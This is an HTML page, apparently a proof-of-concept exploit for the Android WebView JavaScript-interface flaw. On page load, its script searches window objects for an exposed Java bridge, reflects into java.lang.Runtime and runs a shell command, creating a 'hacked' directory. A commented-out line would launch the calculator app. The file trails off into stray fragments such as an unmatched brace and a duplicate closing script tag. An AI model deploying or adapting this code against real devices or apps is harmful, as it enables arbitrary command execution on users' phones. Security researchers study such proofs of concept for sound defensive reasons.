<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf8">
    <script>
      var i=0;
      function getContents(inputStream)
      {
        var contents = ""+i;
        var b = inputStream.read();
        var i = 1;
        while(b != -1) {
            var bString = String.fromCharCode(b);
            contents += bString;
            contents += "\n"
            b = inputStream.read();
        }
        i=i+1;
        return contents;
       }
      
       function execute(cmdArgs)
       {
        for (var obj in window) {
            //console.log(obj);
            if ("getClass" in window[obj]) {
                alert(window[obj].getClass());
                return window[obj].getClass().getClassLoader().loadClass( "java.lang.Runtime" ).
                    getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
             }
         }
       } 
      execute(["mkdir", "hacked"]);
      //var p = execute(["am", "start", "-n", "com.android.calculator2/com.android.calculator2.Calculator"]);
    </script>

    {
        Android.showToast(toast);

    </script>
